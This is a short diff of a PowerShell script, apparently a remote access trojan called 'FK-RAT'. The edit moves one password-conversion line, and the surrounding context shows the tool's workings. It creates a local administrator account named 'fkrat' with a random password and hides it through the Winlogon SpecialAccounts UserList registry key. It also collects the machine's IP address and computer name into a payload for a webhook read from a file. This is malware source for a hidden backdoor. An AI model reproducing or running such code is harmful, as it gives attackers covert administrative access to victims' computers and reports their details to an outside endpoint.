@@ -52,7 +52,6 @@ $dirName = randomText
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress 
 $pWord = randomText
 $uName = "fkrat"
-$pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
 $Webhook = Get-Content ./webhook
@@ -75,6 +74,7 @@ New-Item ./$env:computername.fk -Value (
 $payload = [PSCustomObject]@{content=$description}
 
 ## Create Admin
+$pWord = (ConvertTo-SecureString  $pWord -AsPlainText -Force)
 createAdmin -uName $uName -pWord $pWord
 
 ## Hide FK-RAT User (Admin)
